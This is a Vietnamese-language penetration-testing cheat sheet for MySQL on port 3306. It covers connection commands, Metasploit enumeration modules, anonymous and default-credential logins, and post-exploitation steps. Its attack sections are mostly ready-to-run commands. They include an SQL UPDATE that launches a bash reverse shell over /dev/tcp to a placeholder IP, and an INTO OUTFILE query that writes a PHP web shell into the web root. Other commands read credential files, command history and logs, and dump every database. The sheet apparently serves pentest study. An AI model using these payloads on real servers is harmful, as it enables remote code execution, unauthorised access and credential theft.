# MySQL (Port 3306)

## Connect

### Local

Kết nối tới MySQL cục bộ với tên người dùng, tùy chọn mật khẩu hoặc cơ sở dữ liệu:

```
mysql -u <username>
mysql -u <username> -p
mysql -u <username> -p <database_name>
```

### Remote

Kết nối tới máy chủ MySQL từ xa với tên người dùng, hostname, cổng, và tùy chọn cơ sở dữ liệu:

```
mysql -u <username> -h <ip> -P <port> -p
mysql -u <username> -h <ip> -P <port> -p -D <database_name>
```

### URL

Sử dụng URL MySQL để kết nối ứng dụng với cơ sở dữ liệu:

```
mysql://<username>:<password>@<ip>:<port>/<database_name>
```

***

## Enumeration

### Kiểm tra bằng Metasploit

Sử dụng các module Metasploit để liệt kê phiên bản, lược đồ, hoặc tài khoản người dùng:

```
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/admin/mysql/mysql_enum
msf> use auxiliary/scanner/mysql/mysql_schemadump
```

***

## Attack Vectors

### Đăng nhập ẩn danh

Kết nối tới MySQL mà không cần mật khẩu bằng tài khoản ẩn danh:

```
mysql -u anonymous -h <ip> -P 3306
```

### Đăng nhập với thông tin mặc định

Thử đăng nhập với thông tin đăng nhập mặc định như `root` với mật khẩu trống hoặc yếu:

```
mysql -u root -p
# Nhập mật khẩu mặc định hoặc để trống
```

### Thực thi mã từ xa qua SQL Injection

Tận dụng lỗ hổng SQL Injection để thực thi mã hệ thống thông qua cập nhật dữ liệu:

{% code overflow="wrap" %}

```
mysql> UPDATE DB.users SET email='example@shell|| bash -c "bash -i >& /dev/tcp/<your_ip>/<port> 0>&1" &' WHERE name LIKE 'user%';
```

{% endcode %}

***

## Post-Exploitation

### **Các lệnh MySQL thông dụng**

<table><thead><tr><th width="171">Câu lệnh</th><th width="223">Description</th><th width="347">Cách dùng</th></tr></thead><tbody><tr><td><code>SHOW DATABASES;</code></td><td>Liệt kê Database</td><td><code>SHOW DATABASES;</code></td></tr><tr><td><code>USE</code></td><td>Đổi Database</td><td><code>USE database_name;</code></td></tr><tr><td><code>SHOW TABLES;</code></td><td>Liệt kê các bảng trong Database</td><td><code>SHOW TABLES;</code></td></tr><tr><td><code>SHOW COLUMNS FROM</code></td><td>Liệt kê các cột trong bảng</td><td><code>SHOW COLUMNS FROM table_name;</code></td></tr><tr><td><code>SELECT</code></td><td>Truy xuất dữ liệu</td><td><code>SELECT * FROM table_name;</code></td></tr><tr><td><code>INSERT INTO</code></td><td>Chèn bản ghi mới vào bảng</td><td><code>INSERT INTO table_name (column1, column2) VALUES (value1, value2);</code></td></tr><tr><td><code>UPDATE</code></td><td>Cập nhật các bản ghi  trong bảng</td><td><code>UPDATE table_name SET column1 = value1 WHERE condition;</code></td></tr><tr><td><code>DELETE FROM</code></td><td>Xóa các bản ghi trong bảng</td><td><code>DELETE FROM table_name WHERE condition;</code></td></tr><tr><td><code>CREATE DATABASE</code></td><td>Tạo Database mới</td><td><code>CREATE DATABASE database_name;</code></td></tr><tr><td><code>DROP DATABASE</code></td><td>Xóa Database</td><td><code>DROP DATABASE database_name;</code></td></tr><tr><td><code>CREATE TABLE</code></td><td>Tạo bảng mới</td><td><code>CREATE TABLE table_name (column1 datatype, column2 datatype);</code></td></tr><tr><td><code>DROP TABLE</code></td><td>Xóa bảng</td><td><code>DROP TABLE table_name;</code></td></tr><tr><td><code>ALTER TABLE ADD</code></td><td>Thêm cột mới</td><td><code>ALTER TABLE table_name ADD column_name datatype;</code></td></tr><tr><td><code>ALTER TABLE DROP COLUMN</code></td><td>Xóa cột</td><td><code>ALTER TABLE table_name DROP COLUMN column_name;</code></td></tr><tr><td><code>GRANT</code></td><td>Cấp quyền cho user</td><td><code>GRANT ALL PRIVILEGES ON database_name.* TO 'user'@'localhost' IDENTIFIED BY 'password';</code></td></tr><tr><td><code>REVOKE</code></td><td>Thu hồi quyền của user</td><td><code>REVOKE ALL PRIVILEGES ON database_name.* FROM 'user'@'localhost';</code></td></tr><tr><td><code>SHOW GRANTS FOR</code></td><td>Liệt kê các quyền của user</td><td><code>SHOW GRANTS FOR 'user'@'localhost';</code></td></tr><tr><td><code>FLUSH PRIVILEGES;</code></td><td>Tải lại bảng quyền</td><td><code>FLUSH PRIVILEGES;</code></td></tr></tbody></table>

### Sao lưu toàn bộ cơ sở dữ liệu

Sao lưu tất cả cơ sở dữ liệu để trích xuất thông tin:

```
mysqldump -u <username> -p <password> --all-databases --skip-lock-tables
```

### Đọc tệp hệ thống

Sử dụng hàm load\_file để đọc nội dung tệp từ hệ thống tệp của máy chủ:

```
SELECT load_file('/var/lib/mysql-files/key.txt');
```

### Ghi tệp hệ thống cho RCE

Ghi script độc hại vào thư mục web để thực thi mã từ xa:

{% code overflow="wrap" %}

```
SELECT 1,2,"<?php echo shell_exec($_GET['command']);?>" INTO OUTFILE '/var/www/html/shell.php';
```

{% endcode %}

### Truy cập tệp cấu hình MySQL

Kiểm tra các tệp cấu hình để tìm thông tin đăng nhập.

Unix:

```
cat /etc/mysql/my.cnf
cat ~/.my.cnf
```

Windows:

```
type config.ini
type my.ini
```

### Kiểm tra lịch sử lệnh

Xem lịch sử lệnh MySQL để tìm thông tin nhạy cảm:

```
cat ~/.mysql_history
```

### Kiểm tra tệp nhật ký

Kiểm tra các tệp nhật ký để tìm dữ liệu nhạy cảm:

```
cat connections.log
cat update.log
cat common.log
```

### Tìm mật khẩu trong ứng dụng

Kiểm tra tệp cấu hình ứng dụng web để tìm thông tin đăng nhập MySQL:

```
cat /var/www/html/configuration.php
```